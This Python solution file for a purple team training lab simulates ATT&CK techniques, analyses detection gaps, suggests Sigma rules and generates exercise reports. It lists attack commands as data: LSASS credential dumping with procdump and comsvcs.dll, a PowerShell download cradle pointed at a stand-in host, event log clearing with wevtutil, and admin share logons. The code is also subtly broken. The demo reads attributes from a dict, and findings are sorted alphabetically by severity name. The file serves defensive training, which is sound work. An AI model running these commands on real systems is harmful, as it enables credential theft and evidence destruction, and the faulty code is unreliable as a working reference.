"""
Lab 20b: AI-Assisted Purple Team Exercises - Solution

Complete implementation of AI-powered purple team tools.
"""

import json
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Set

# =============================================================================
# Data Classes
# =============================================================================


class AttackPhase(Enum):
    """Kill chain phases."""

    INITIAL_ACCESS = "initial_access"
    EXECUTION = "execution"
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DEFENSE_EVASION = "defense_evasion"
    CREDENTIAL_ACCESS = "credential_access"
    DISCOVERY = "discovery"
    LATERAL_MOVEMENT = "lateral_movement"
    COLLECTION = "collection"
    COMMAND_AND_CONTROL = "command_and_control"
    EXFILTRATION = "exfiltration"
    IMPACT = "impact"


class CoverageLevel(Enum):
    NONE = "none"
    PARTIAL = "partial"
    GOOD = "good"
    EXCELLENT = "excellent"


class FindingSeverity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class AttackTechnique:
    """A single ATT&CK technique for simulation."""

    technique_id: str
    name: str
    phase: AttackPhase
    description: str
    simulation_command: str
    expected_artifacts: List[str]
    detection_opportunities: List[str]
    sigma_rule_id: Optional[str] = None


@dataclass
class AttackScenario:
    """A complete attack scenario for purple team exercise."""

    name: str
    description: str
    threat_actor: str
    objective: str
    techniques: List[AttackTechnique]
    expected_detections: List[str]
    detection_gaps: List[str] = field(default_factory=list)


@dataclass
class DetectionRule:
    """A detection rule with ATT&CK mapping."""

    rule_id: str
    name: str
    techniques: List[str]
    description: str = ""
    log_sources: List[str] = field(default_factory=list)
    false_positive_rate: str = "low"
    enabled: bool = True


@dataclass
class GapAnalysis:
    """Results of detection gap analysis."""

    total_techniques: int
    covered_techniques: int
    coverage_percentage: float
    critical_gaps: List[str]
    priority_recommendations: List[str]
    tactic_coverage: Dict[str, float]


@dataclass
class PurpleTeamFinding:
    """A finding from a purple team exercise."""

    id: str
    title: str
    severity: FindingSeverity
    technique_id: str
    detection_result: str
    recommendations: List[str] = field(default_factory=list)
    technique_name: str = ""
    description: str = ""
    attack_executed: str = ""
    evidence: List[str] = field(default_factory=list)


@dataclass
class PurpleTeamReport:
    """Complete purple team exercise report."""

    title: str
    exercise_date: str
    executive_summary: str
    scope: str
    threat_scenario: str
    findings: List[PurpleTeamFinding]
    overall_score: float
    detection_rate: float
    critical_gaps: List[str]
    recommendations: List[str]
    appendix: Dict


# =============================================================================
# Exercise 1: Attack Simulator (Complete)
# =============================================================================


class AttackSimulator:
    """Generate and execute attack simulations for purple team exercises."""

    def __init__(self, llm=None):
        self.llm = llm
        self.technique_library = self._load_technique_library()

    def _load_technique_library(self) -> Dict[str, AttackTechnique]:
        """Load library of safe attack simulations."""
        return {
            "T1059.001": AttackTechnique(
                technique_id="T1059.001",
                name="PowerShell",
                phase=AttackPhase.EXECUTION,
                description="Command and script execution via PowerShell",
                simulation_command="powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Write-Host 'Purple Team Test'\"",
                expected_artifacts=[
                    "Windows Event ID 4688 (Process Creation)",
                    "Windows Event ID 4104 (Script Block Logging)",
                    "Sysmon Event ID 1 (Process Create)",
                ],
                detection_opportunities=[
                    "PowerShell with -ExecutionPolicy Bypass",
                    "PowerShell with -NoProfile flag",
                    "PowerShell spawned by unusual parent",
                ],
            ),
            "T1003.001": AttackTechnique(
                technique_id="T1003.001",
                name="LSASS Memory",
                phase=AttackPhase.CREDENTIAL_ACCESS,
                description="Credential dumping from LSASS process memory",
                simulation_command="# Use Atomic Red Team: Invoke-AtomicTest T1003.001",
                expected_artifacts=[
                    "Process accessing lsass.exe",
                    "Windows Event ID 4656 (Handle to LSASS)",
                    "Sysmon Event ID 10 (Process Access)",
                ],
                detection_opportunities=[
                    "Non-system process accessing LSASS",
                    "Known tools (mimikatz, procdump) execution",
                    "Suspicious LSASS access patterns",
                ],
            ),
            "T1055.001": AttackTechnique(
                technique_id="T1055.001",
                name="DLL Injection",
                phase=AttackPhase.DEFENSE_EVASION,
                description="Inject malicious DLL into process memory",
                simulation_command="# Use Atomic Red Team: Invoke-AtomicTest T1055.001",
                expected_artifacts=[
                    "Sysmon Event ID 8 (CreateRemoteThread)",
                    "DLL loaded from unusual path",
                    "Process with injected code",
                ],
                detection_opportunities=[
                    "CreateRemoteThread to remote process",
                    "DLL load from temp/user directories",
                    "Process hollowing patterns",
                ],
            ),
            "T1021.002": AttackTechnique(
                technique_id="T1021.002",
                name="SMB/Windows Admin Shares",
                phase=AttackPhase.LATERAL_MOVEMENT,
                description="Lateral movement via SMB and admin shares",
                simulation_command="# net use \\\\target\\C$ /user:admin password",
                expected_artifacts=[
                    "Windows Event ID 5140 (Network Share Access)",
                    "Windows Event ID 4624 (Logon Type 3)",
                    "SMB traffic to admin shares",
                ],
                detection_opportunities=[
                    "Access to C$, ADMIN$ shares",
                    "Unusual SMB traffic patterns",
                    "Remote service creation",
                ],
            ),
            "T1567.002": AttackTechnique(
                technique_id="T1567.002",
                name="Exfiltration to Cloud Storage",
                phase=AttackPhase.EXFILTRATION,
                description="Data exfiltration to cloud storage services",
                simulation_command="# Simulate upload to cloud storage API",
                expected_artifacts=[
                    "HTTPS traffic to cloud storage APIs",
                    "Large outbound data transfers",
                    "Process connecting to cloud services",
                ],
                detection_opportunities=[
                    "Unusual cloud storage API calls",
                    "Large uploads during off-hours",
                    "Sensitive file access before upload",
                ],
            ),
            "T1547.001": AttackTechnique(
                technique_id="T1547.001",
                name="Registry Run Keys",
                phase=AttackPhase.PERSISTENCE,
                description="Persistence via registry run keys",
                simulation_command="# Use Atomic Red Team: Invoke-AtomicTest T1547.001",
                expected_artifacts=[
                    "Registry modification events",
                    "Sysmon Event ID 13 (Registry Value Set)",
                    "Windows Event ID 4657",
                ],
                detection_opportunities=[
                    "Modification of Run/RunOnce keys",
                    "Unusual executables in startup locations",
                    "Registry changes by suspicious processes",
                ],
            ),
            "T1070.001": AttackTechnique(
                technique_id="T1070.001",
                name="Clear Windows Event Logs",
                phase=AttackPhase.DEFENSE_EVASION,
                description="Clear event logs to remove evidence",
                simulation_command="# wevtutil cl Security (DANGEROUS - simulation only)",
                expected_artifacts=[
                    "Windows Event ID 1102 (Log Cleared)",
                    "Missing log entries (gap detection)",
                ],
                detection_opportunities=[
                    "Event ID 1102 (Security log cleared)",
                    "Event ID 104 (System log cleared)",
                    "Unusual wevtutil.exe execution",
                ],
            ),
        }

    def generate_scenario(
        self,
        threat_actor: str,
        objective: str,
        techniques: List[str],
    ) -> AttackScenario:
        """Generate a complete attack scenario."""
        scenario_techniques = []
        expected_detections = []

        for tech_id in techniques:
            if tech_id in self.technique_library:
                tech = self.technique_library[tech_id]
                scenario_techniques.append(tech)
                expected_detections.extend(tech.detection_opportunities)

        return AttackScenario(
            name=f"{threat_actor} Simulation",
            description=f"Purple team exercise simulating {threat_actor} tactics targeting {objective}",
            threat_actor=threat_actor,
            objective=objective,
            techniques=scenario_techniques,
            expected_detections=list(set(expected_detections)),
        )

    def get_atomic_tests(self, technique_id: str) -> Dict:
        """Get Atomic Red Team tests for a technique."""
        atomic_tests = {
            "T1059.001": {
                "name": "PowerShell",
                "tests": [
                    {
                        "name": "Mimikatz Detection Test",
                        "command": "powershell.exe -enc [base64]",
                        "cleanup": "Remove-Item test.ps1",
                    },
                    {
                        "name": "Download Cradle",
                        "command": "IEX (New-Object Net.WebClient).DownloadString('http://test')",
                        "cleanup": None,
                    },
                ],
                "repo": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001",
            },
            "T1003.001": {
                "name": "LSASS Memory",
                "tests": [
                    {
                        "name": "Dump LSASS with comsvcs.dll",
                        "command": "rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump",
                        "cleanup": "del lsass.dmp",
                    },
                    {
                        "name": "ProcDump",
                        "command": "procdump.exe -ma lsass.exe lsass.dmp",
                        "cleanup": "del lsass.dmp",
                    },
                ],
                "repo": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001",
            },
        }
        return atomic_tests.get(technique_id, {"note": "No Atomic tests available"})

    def get_caldera_ability(self, technique_id: str) -> Dict:
        """Get MITRE Caldera ability mapping."""
        return {
            "technique_id": technique_id,
            "caldera_ability": f"Auto-generated ability for {technique_id}",
            "platform": "windows",
            "executor": "psh",
            "note": "Use Caldera for automated adversary emulation",
        }


# =============================================================================
# Exercise 2: Detection Gap Analyzer (Complete)
# =============================================================================


class DetectionGapAnalyzer:
    """Analyze detection coverage against MITRE ATT&CK."""

    def __init__(self, llm=None):
        self.llm = llm
        self.attack_matrix = self._load_attack_matrix()

    def _load_attack_matrix(self) -> Dict[str, Dict]:
        """Load ATT&CK matrix."""
        return {
            "initial_access": {
                "T1566.001": {"name": "Spearphishing Attachment", "priority": "high"},
                "T1566.002": {"name": "Spearphishing Link", "priority": "high"},
                "T1190": {"name": "Exploit Public-Facing Application", "priority": "high"},
                "T1133": {"name": "External Remote Services", "priority": "medium"},
            },
            "execution": {
                "T1059.001": {"name": "PowerShell", "priority": "critical"},
                "T1059.003": {"name": "Windows Command Shell", "priority": "high"},
                "T1204.002": {"name": "Malicious File", "priority": "high"},
                "T1047": {"name": "WMI", "priority": "medium"},
            },
            "persistence": {
                "T1547.001": {"name": "Registry Run Keys", "priority": "high"},
                "T1053.005": {"name": "Scheduled Task", "priority": "high"},
                "T1543.003": {"name": "Windows Service", "priority": "medium"},
            },
            "privilege_escalation": {
                "T1055": {"name": "Process Injection", "priority": "critical"},
                "T1134": {"name": "Access Token Manipulation", "priority": "high"},
                "T1068": {"name": "Exploitation for Privilege Escalation", "priority": "high"},
            },
            "defense_evasion": {
                "T1070.001": {"name": "Clear Windows Event Logs", "priority": "critical"},
                "T1036": {"name": "Masquerading", "priority": "high"},
                "T1055.001": {"name": "DLL Injection", "priority": "critical"},
                "T1027": {"name": "Obfuscated Files", "priority": "medium"},
            },
            "credential_access": {
                "T1003.001": {"name": "LSASS Memory", "priority": "critical"},
                "T1003.002": {"name": "Security Account Manager", "priority": "high"},
                "T1558.003": {"name": "Kerberoasting", "priority": "high"},
            },
            "lateral_movement": {
                "T1021.001": {"name": "Remote Desktop Protocol", "priority": "high"},
                "T1021.002": {"name": "SMB/Windows Admin Shares", "priority": "high"},
                "T1550.002": {"name": "Pass the Hash", "priority": "critical"},
            },
            "exfiltration": {
                "T1041": {"name": "Exfiltration Over C2 Channel", "priority": "high"},
                "T1567.002": {"name": "Exfiltration to Cloud Storage", "priority": "high"},
            },
        }

    def analyze_coverage(
        self,
        detection_rules: List[DetectionRule],
    ) -> GapAnalysis:
        """Analyze detection coverage against ATT&CK matrix."""
        covered_techniques = set()
        for rule in detection_rules:
            if rule.enabled:
                covered_techniques.update(rule.techniques)

        tactic_coverage = {}
        total_techniques = 0
        critical_gaps = []

        for tactic, techniques in self.attack_matrix.items():
            total_techniques += len(techniques)
            covered_in_tactic = sum(1 for t in techniques if t in covered_techniques)
            coverage = covered_in_tactic / len(techniques) if techniques else 0
            tactic_coverage[tactic] = coverage

            for tech_id, tech_info in techniques.items():
                if tech_id not in covered_techniques:
                    if tech_info["priority"] in ["critical", "high"]:
                        critical_gaps.append(
                            f"{tech_id}: {tech_info['name']} ({tech_info['priority']})"
                        )

        recommendations = self._generate_recommendations(critical_gaps, tactic_coverage)
        overall_coverage = len(covered_techniques) / total_techniques if total_techniques else 0

        return GapAnalysis(
            total_techniques=total_techniques,
            covered_techniques=len(covered_techniques),
            coverage_percentage=overall_coverage * 100,
            critical_gaps=sorted(critical_gaps)[:10],
            priority_recommendations=recommendations,
            tactic_coverage=tactic_coverage,
        )

    def _generate_recommendations(
        self, gaps: List[str], tactic_coverage: Dict[str, float]
    ) -> List[str]:
        """Generate prioritized recommendations."""
        recommendations = []

        sorted_tactics = sorted(tactic_coverage.items(), key=lambda x: x[1])
        for tactic, coverage in sorted_tactics[:3]:
            if coverage < 0.7:
                recommendations.append(
                    f"Improve {tactic.replace('_', ' ')} coverage (currently {coverage:.0%})"
                )

        if gaps:
            recommendations.append(f"Address {len(gaps)} high-priority detection gaps")

        recommendations.extend(
            [
                "Deploy Atomic Red Team for continuous validation",
                "Enable enhanced logging (Sysmon, PowerShell Script Block)",
                "Review and tune existing detection rules",
            ]
        )

        return recommendations

    def suggest_detection_rule(self, technique_id: str) -> Dict:
        """Suggest a Sigma detection rule for a technique."""
        sigma_templates = {
            "T1059.001": {
                "title": "Suspicious PowerShell Execution",
                "status": "experimental",
                "logsource": {"product": "windows", "service": "powershell"},
                "detection": {
                    "selection": {
                        "ScriptBlockText|contains": [
                            "-ExecutionPolicy Bypass",
                            "-NoProfile",
                            "-EncodedCommand",
                            "IEX",
                            "Invoke-Expression",
                        ]
                    },
                    "condition": "selection",
                },
                "level": "medium",
                "tags": ["attack.execution", "attack.t1059.001"],
            },
            "T1003.001": {
                "title": "LSASS Memory Access",
                "status": "experimental",
                "logsource": {"product": "windows", "category": "process_access"},
                "detection": {
                    "selection": {
                        "TargetImage|endswith": "\\lsass.exe",
                        "GrantedAccess|contains": ["0x1010", "0x1410"],
                    },
                    "filter": {"SourceImage|endswith": ["\\wmiprvse.exe", "\\svchost.exe"]},
                    "condition": "selection and not filter",
                },
                "level": "high",
                "tags": ["attack.credential_access", "attack.t1003.001"],
            },
            "T1070.001": {
                "title": "Security Event Log Cleared",
                "status": "stable",
                "logsource": {"product": "windows", "service": "security"},
                "detection": {"selection": {"EventID": 1102}, "condition": "selection"},
                "level": "high",
                "tags": ["attack.defense_evasion", "attack.t1070.001"],
            },
        }

        return sigma_templates.get(
            technique_id,
            {
                "title": f"Detection for {technique_id}",
                "note": "Custom rule needed - use AI to generate",
            },
        )


# =============================================================================
# Exercise 3: Purple Team Reporter (Complete)
# =============================================================================


class PurpleTeamReporter:
    """Generate comprehensive purple team reports."""

    def __init__(self, llm=None):
        self.llm = llm

    def generate_report(
        self,
        exercise_name: str,
        findings: List[PurpleTeamFinding],
        threat_scenario: str = "",
        scope: str = "",
    ) -> Dict:
        """
        Generate a complete purple team report.

        Returns a dict for test compatibility with keys:
        - detection_rate: percentage of tests that detected the attack
        - critical_gaps: list of undetected high/critical findings
        - findings: sorted list of findings
        - etc.
        """
        total_tests = len(findings)
        detected = sum(1 for f in findings if f.detection_result == "detected")
        detection_rate = (detected / total_tests * 100) if total_tests else 0

        critical_gaps = [
            f.title
            for f in findings
            if f.detection_result == "not_detected"
            and f.severity in [FindingSeverity.CRITICAL, FindingSeverity.HIGH]
        ]

        recommendations = self._generate_recommendations(findings)
        overall_score = self._calculate_score(findings)
        exec_summary = self._generate_executive_summary(
            exercise_name, detection_rate, critical_gaps, overall_score
        )

        # Return dict for test compatibility
        return {
            "title": f"Purple Team Report: {exercise_name}",
            "exercise_date": datetime.now().strftime("%Y-%m-%d"),
            "executive_summary": exec_summary,
            "scope": scope,
            "threat_scenario": threat_scenario,
            "findings": sorted(findings, key=lambda f: f.severity.value),
            "overall_score": overall_score,
            "detection_rate": detection_rate,
            "critical_gaps": critical_gaps,
            "recommendations": recommendations,
            "appendix": self._generate_appendix(findings),
        }

    def _generate_executive_summary(
        self, exercise_name: str, detection_rate: float, critical_gaps: List[str], score: float
    ) -> str:
        """Generate executive summary."""
        if score >= 80:
            assessment = "STRONG"
            outlook = "Minimal critical gaps identified."
        elif score >= 60:
            assessment = "MODERATE"
            outlook = "Several improvement opportunities identified."
        else:
            assessment = "NEEDS IMPROVEMENT"
            outlook = "Significant detection gaps require immediate attention."

        return f"""
PURPLE TEAM EXERCISE: {exercise_name}
{'=' * 60}

OVERALL ASSESSMENT: {assessment} ({score:.0f}/100)

Detection Rate: {detection_rate:.0f}% of tested techniques were detected
Critical Gaps: {len(critical_gaps)} high-priority gaps identified

{outlook}

TOP PRIORITY: {critical_gaps[0] if critical_gaps else "No critical gaps"}

IMMEDIATE ACTIONS:
1. Address critical detection gaps
2. Tune existing rules to reduce false negatives  
3. Implement recommended Sigma rules
4. Schedule follow-up validation exercise
""".strip()

    def _generate_recommendations(self, findings: List[PurpleTeamFinding]) -> List[str]:
        """Generate prioritized recommendations."""
        recommendations = []

        not_detected = [f for f in findings if f.detection_result == "not_detected"]
        partial = [f for f in findings if f.detection_result == "partially_detected"]

        critical_gaps = [
            f
            for f in not_detected
            if f.severity in [FindingSeverity.CRITICAL, FindingSeverity.HIGH]
        ]

        if critical_gaps:
            tech_ids = ", ".join(f.technique_id for f in critical_gaps[:3])
            recommendations.append(
                f"CRITICAL: Implement detections for {len(critical_gaps)} "
                f"high-priority techniques: {tech_ids}"
            )

        if partial:
            recommendations.append(f"Tune {len(partial)} partially-effective detections")

        recommendations.extend(
            [
                "Enable PowerShell Script Block Logging (Event ID 4104)",
                "Deploy Sysmon with recommended configuration",
                "Implement behavioral detection rules",
                "Schedule quarterly purple team exercises",
            ]
        )

        return recommendations

    def _calculate_score(self, findings: List[PurpleTeamFinding]) -> float:
        """Calculate overall security score."""
        if not findings:
            return 0.0

        weights = {
            FindingSeverity.CRITICAL: 5,
            FindingSeverity.HIGH: 4,
            FindingSeverity.MEDIUM: 2,
            FindingSeverity.LOW: 1,
            FindingSeverity.INFO: 0.5,
        }

        total_weight = sum(weights[f.severity] for f in findings)
        detected_weight = sum(
            weights[f.severity] for f in findings if f.detection_result == "detected"
        )
        partial_weight = sum(
            weights[f.severity] * 0.5
            for f in findings
            if f.detection_result == "partially_detected"
        )

        score = ((detected_weight + partial_weight) / total_weight * 100) if total_weight else 0
        return min(score, 100)

    def _generate_appendix(self, findings: List[PurpleTeamFinding]) -> Dict:
        """Generate report appendix."""
        return {
            "techniques_tested": [f.technique_id for f in findings],
            "mitre_mapping": {f.technique_id: f.technique_name for f in findings},
            "total_findings": len(findings),
            "by_severity": {
                sev.value: len([f for f in findings if f.severity == sev])
                for sev in FindingSeverity
            },
            "by_result": {
                "detected": len([f for f in findings if f.detection_result == "detected"]),
                "partial": len([f for f in findings if f.detection_result == "partially_detected"]),
                "not_detected": len([f for f in findings if f.detection_result == "not_detected"]),
            },
        }


# =============================================================================
# Main Demo
# =============================================================================


def main():
    """Demonstrate purple team AI capabilities."""

    print("=" * 70)
    print("Lab 20b: AI-Assisted Purple Team Exercises - SOLUTION")
    print("=" * 70)

    # Demo: Attack Simulation
    print("\n" + "=" * 70)
    print("[1] Attack Scenario Generation")
    print("=" * 70)

    simulator = AttackSimulator()
    scenario = simulator.generate_scenario(
        threat_actor="APT29",
        objective="Data exfiltration from finance department",
        techniques=["T1059.001", "T1003.001", "T1021.002", "T1567.002"],
    )

    print(f"\n📋 Scenario: {scenario.name}")
    print(f"   Objective: {scenario.objective}")
    print(f"   Techniques: {len(scenario.techniques)}")
    for tech in scenario.techniques:
        print(f"     • {tech.technique_id}: {tech.name} ({tech.phase.value})")

    print(f"\n   Expected Detections: {len(scenario.expected_detections)}")
    for det in scenario.expected_detections[:5]:
        print(f"     • {det}")

    # Show Atomic Red Team tests
    print("\n   Atomic Red Team Tests:")
    atomic = simulator.get_atomic_tests("T1059.001")
    print(f"     Technique: {atomic.get('name')}")
    for test in atomic.get("tests", [])[:2]:
        print(f"       - {test['name']}")

    # Demo: Gap Analysis
    print("\n" + "=" * 70)
    print("[2] Detection Gap Analysis")
    print("=" * 70)

    sample_rules = [
        DetectionRule(
            rule_id="sigma_001",
            name="Suspicious PowerShell Execution",
            description="Detect suspicious PowerShell usage",
            techniques=["T1059.001"],
            log_sources=["windows_powershell"],
            false_positive_rate="medium",
        ),
        DetectionRule(
            rule_id="sigma_002",
            name="LSASS Memory Access",
            description="Detect LSASS memory access",
            techniques=["T1003.001"],
            log_sources=["sysmon"],
            false_positive_rate="low",
        ),
        DetectionRule(
            rule_id="sigma_003",
            name="Admin Share Access",
            description="Detect admin share access",
            techniques=["T1021.002"],
            log_sources=["windows_security"],
            false_positive_rate="high",
        ),
    ]

    analyzer = DetectionGapAnalyzer()
    analysis = analyzer.analyze_coverage(sample_rules)

    print(f"\n📊 Coverage Analysis")
    print(f"   Total Techniques: {analysis.total_techniques}")
    print(f"   Covered: {analysis.covered_techniques}")
    print(f"   Coverage: {analysis.coverage_percentage:.1f}%")

    print(f"\n   Coverage by Tactic:")
    for tactic, coverage in sorted(analysis.tactic_coverage.items(), key=lambda x: x[1]):
        bar = "█" * int(coverage * 20) + "░" * (20 - int(coverage * 20))
        emoji = "🔴" if coverage < 0.3 else "🟡" if coverage < 0.7 else "🟢"
        print(f"     {emoji} {tactic:25} [{bar}] {coverage:.0%}")

    print(f"\n   Critical Gaps ({len(analysis.critical_gaps)}):")
    for gap in analysis.critical_gaps[:5]:
        print(f"     ⚠️ {gap}")

    # Show suggested rule
    print("\n   Suggested Detection Rule (T1070.001):")
    rule = analyzer.suggest_detection_rule("T1070.001")
    print(f"     Title: {rule.get('title')}")
    print(f"     Level: {rule.get('level')}")

    # Demo: Report Generation
    print("\n" + "=" * 70)
    print("[3] Purple Team Report Generation")
    print("=" * 70)

    sample_findings = [
        PurpleTeamFinding(
            id="PT-001",
            title="PowerShell Execution Detected",
            severity=FindingSeverity.HIGH,
            technique_id="T1059.001",
            technique_name="PowerShell",
            description="PowerShell execution with bypass flags was detected",
            attack_executed="powershell.exe -NoProfile -ExecutionPolicy Bypass",
            detection_result="detected",
            evidence=["Event ID 4104 triggered", "Sigma rule matched"],
            recommendations=[],
        ),
        PurpleTeamFinding(
            id="PT-002",
            title="LSASS Access Partially Detected",
            severity=FindingSeverity.CRITICAL,
            technique_id="T1003.001",
            technique_name="LSASS Memory",
            description="LSASS access was partially detected",
            attack_executed="procdump.exe -ma lsass.exe",
            detection_result="partially_detected",
            evidence=["Process creation logged", "Access event missed"],
            recommendations=["Enable Sysmon Event ID 10"],
        ),
        PurpleTeamFinding(
            id="PT-003",
            title="Log Clearing Not Detected",
            severity=FindingSeverity.CRITICAL,
            technique_id="T1070.001",
            technique_name="Clear Windows Event Logs",
            description="Event log clearing was not detected",
            attack_executed="wevtutil cl Security",
            detection_result="not_detected",
            evidence=[],
            recommendations=["Implement Event ID 1102 detection"],
        ),
        PurpleTeamFinding(
            id="PT-004",
            title="Admin Share Access Not Detected",
            severity=FindingSeverity.HIGH,
            technique_id="T1021.002",
            technique_name="SMB/Windows Admin Shares",
            description="Admin share access was not detected",
            attack_executed="net use \\\\target\\C$",
            detection_result="not_detected",
            evidence=[],
            recommendations=["Monitor Event ID 5140"],
        ),
    ]

    reporter = PurpleTeamReporter()
    report = reporter.generate_report(
        exercise_name="Q1 2026 APT29 Simulation",
        threat_scenario="APT29 data exfiltration campaign",
        findings=sample_findings,
        scope="Corporate Windows endpoints",
    )

    print(f"\n{report.executive_summary}")

    print(f"\n📈 Metrics:")
    print(f"   Detection Rate: {report.detection_rate:.0f}%")
    print(f"   Overall Score: {report.overall_score:.0f}/100")

    print(f"\n🔴 Critical Gaps ({len(report.critical_gaps)}):")
    for gap in report.critical_gaps:
        print(f"   • {gap}")

    print(f"\n📝 Recommendations:")
    for rec in report.recommendations[:4]:
        print(f"   → {rec}")

    print("\n" + "=" * 70)
    print("Lab 20b Complete!")
    print("=" * 70)


if __name__ == "__main__":
    main()
